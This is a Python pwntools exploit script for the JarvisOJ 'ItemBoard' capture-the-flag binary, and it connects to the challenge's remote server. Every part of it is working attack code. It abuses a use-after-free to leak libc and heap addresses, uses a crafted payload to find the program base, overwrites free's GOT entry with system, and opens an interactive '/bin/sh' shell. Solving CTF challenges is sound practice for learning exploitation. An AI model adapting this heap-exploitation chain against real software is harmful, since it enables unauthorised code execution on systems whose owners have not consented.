#!/usr/bin/env python

from pwn import *
context.log_level = 'debug'
DEBUG = 0
if DEBUG:
    
    p = process('LD_PRELOAD=/home/veritas/pwn/jarvisoj/ItemBoard/libc-2.19.so ./itemboard',shell=True)
else:
    p = remote("pwn2.jarvisoj.com", 9887)

def new_item(name, length, des):
    p.recvuntil('choose:')
    p.sendline('1')
    p.recvuntil('Item name?')
    p.sendline(name)
    p.recvuntil('len?')
    p.sendline(str(length))
    p.recvuntil('Description?')
    p.sendline(des)

def list_item():
    p.recvuntil('choose:')
    p.sendline('2')
    print p.recvuntil('1.')

def show_item(num, ans='Description:'):
    p.recvuntil('choose:')
    p.sendline('3')
    p.recvuntil('Which item?')
    p.sendline(str(num))
    p.recvuntil(ans)


def delete_item(num):
    p.recvuntil('choose:')
    p.sendline('4')
    p.recvuntil('Which item?')
    p.sendline(str(num))

def exp():

    # 1. Leaking libc address and heap address!
    new_item('0'*8, 256, '0'*16)
    new_item('1'*8, 32, '1'*16)
    delete_item(0)
    show_item(0)  
    addr = p.recvuntil('\n')
    main_arena = u64(addr[0:-1].ljust(8, '\x00'))
    delete_item(1)
    show_item(1)
    addr = p.recvuntil('\n')
    heap_addr = u64(addr[0:-1].ljust(8, '\x00'))

    if DEBUG:
        libc = main_arena - 0x3c3b10 - 0x68
        system_addr = libc + 0x45390
    else:
        libc = main_arena - 0x3be740 - 0x78
        system_addr = libc + 0x46590

    log.success("libc address: " + hex(libc))
    log.success("system address: " + hex(system_addr))
    log.success("heap address: " + hex(heap_addr))

    # 2. Getting .text address
    payload =  p64(heap_addr)
    payload =  payload.ljust(1032, 'a')
    payload += p64(heap_addr + 0x38)
    new_item(p64(heap_addr - 0x10), 1048, payload)
    show_item(1, 'Name:')
    addr = p.recvuntil('\n')
    item_free = u64(addr[0:-1].ljust(8, '\x00'))
    text = item_free - 0xb39
    free_got = text + 0x202018
    log.success("text address: " + hex(text))

    # 3. Overwriting free_got
    payload =  p64(system_addr)
    payload =  payload.ljust(1032, 'a')
    payload += p64(heap_addr - 0x148)
    new_item("/bin/sh\x00", 32, p64(free_got))
    new_item('4'*16, 1048, payload)
    delete_item(3)

    p.interactive()

if __name__ == '__main__':
    exp()